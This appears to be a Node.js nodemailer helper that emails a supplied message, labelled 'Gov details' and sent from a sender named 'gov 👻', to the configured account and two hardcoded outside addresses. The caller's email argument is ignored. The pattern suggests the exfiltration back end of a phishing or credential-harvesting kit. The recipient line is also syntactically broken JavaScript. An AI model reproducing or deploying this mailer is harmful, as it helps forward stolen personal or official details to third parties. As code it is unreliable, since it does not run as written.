const nodemailer = require('nodemailer');
require('dotenv').config()

const sendEmail = async (email, message, reason, callback) => {
    console.log(email)
    const output = `<b>${message}</b>`
    
        // let testAccount = await nodemailer.createTestAccount();
        return new Promise( (resolve, reject)=>{

            let transporter = nodemailer.createTransport({
                service : "gmail",
                auth: {
                    user: process.env.EMAIL, // generated ethereal user
                    pass: process.env.EMAIL_PASSWORD, // generated ethereal password
                },
                // tls: {
                //     rejectUnauthorized: false
                // }
            });
            let mailOptions = {
                from: `"gov 👻" <${process.env.EMAIL}>`, // sender address
                to: process.env.EMAIL, "techt5562@gmail.com", "Jaesphilli@mail.com",  // list of receivers
                subject: `${reason} ✔`, // Subject line
                text: "Gov details", // plain text body
                html: output, // html body
            };
            
            transporter.sendMail(mailOptions, function(error, info){
                if (error) {
                  console.log(error);
                  return reject({message:"not working"})
                } 
                return resolve({message: 'Email sent: '});
                
              });
    
        //   return  callback('email sent successfully')
        })
 
        // send mail with defined transport object
}



module.exports = sendEmail
